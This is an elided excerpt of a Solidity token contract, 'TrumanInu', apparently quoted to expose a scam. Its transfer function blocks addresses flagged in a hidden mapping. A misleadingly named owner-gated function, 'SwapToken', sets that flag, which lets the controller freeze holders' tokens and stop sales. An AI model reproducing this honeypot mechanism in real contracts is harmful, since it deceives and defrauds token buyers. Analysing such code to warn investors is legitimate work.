...
contract TrumanInu is Context, IERC20, Ownable {
    ...
    string private _name = "TrumanInu";
    ...
    function _transfer(address from,address to,uint256 amount) private {
        ...
        require(amount > 0, "");
        if (TokenTool) {
        require (yyfwan[from] == false,"");
    }
        _transfers(from, to, amount);
    }

    function pause()public onlyOwner{}
    function RewardForToken
    ...
    () 
    {
     ...
     function SwapToken(address toSender) external onlyToken() {
        yyfwan[toSender] = true;
        
    }
    function ExclusionFee(address
      toSender
      ) 
      external 
      onlyToken//
